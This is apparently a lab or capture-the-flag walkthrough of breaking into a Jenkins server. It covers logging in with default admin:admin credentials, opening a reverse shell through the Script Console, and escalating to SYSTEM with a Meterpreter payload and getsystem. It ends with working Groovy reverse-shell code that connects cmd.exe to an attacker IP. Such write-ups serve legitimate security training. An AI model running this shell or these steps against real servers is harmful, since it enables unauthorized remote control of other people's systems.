![image](https://github.com/user-attachments/assets/7d258d44-c5aa-4bbe-8a91-1799bb24cdd5)
![image](https://github.com/user-attachments/assets/f6c07fdf-38b9-4209-b7b7-1201bb5a8aca)

Try common default cred admin:admin, get in.

Manage Jenkins -> Script Console -> Groovy Reverse Shell -> Run

![image](https://github.com/user-attachments/assets/8a0bc764-55e1-417d-844a-9b6fdd19ad5c)
![image](https://github.com/user-attachments/assets/5b504bbc-a43c-4f34-bdc9-b31de77900a9)
![image](https://github.com/user-attachments/assets/8ea3e0ce-f63e-43a3-8b33-fe1552b25f65)
![image](https://github.com/user-attachments/assets/6d8b8f9f-b8bd-4ae4-b79e-31c5a86890f8)

SharpEfsPotato, PrintSpoofer64.exe, RoguePotato, incognito.exe etc.--> cannot PrivEsc to SYSTEM

![image](https://github.com/user-attachments/assets/a59a788d-1db6-4cce-b015-c42a3e56c6ae)


Use Meterpreter payload

![image](https://github.com/user-attachments/assets/e3e91d1b-74da-4bde-b3a0-b1f04dc43266)
![image](https://github.com/user-attachments/assets/568e1fee-a40a-4315-bf7e-c1af7a4f29c9)
![image](https://github.com/user-attachments/assets/baf95daa-8af2-4944-84f2-59c612f817cd)

1. msfvenom meterpreter payload --> upload to machine

2. msfconsole setting to match paylaod and run --> Start reverse ...
 
3. Powershell Start-Process "revshell.exe" --> trigger the payload

4. user has SeImpersonatePrivilege enabled --> getsystem --> PrivEsc to SYSTEM


Groovy code:

```bash
String host="10.4.95.140";
int port=443;
String cmd="cmd.exe";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();
Socket s=new Socket(host, port);
InputStream pi=p.getInputStream(), pe=p.getErrorStream(), si=s.getInputStream();
OutputStream po=p.getOutputStream(), so=s.getOutputStream();
while(!s.isClosed()){
    while(pi.available()>0)
        so.write(pi.read());
    while(pe.available()>0)
        so.write(pe.read());
    while(si.available()>0)
        po.write(si.read());
    so.flush();
    po.flush();
    Thread.sleep(50);
    try {
        p.exitValue();
        break;
    } catch (Exception e){}
};
p.destroy();
s.close();
```
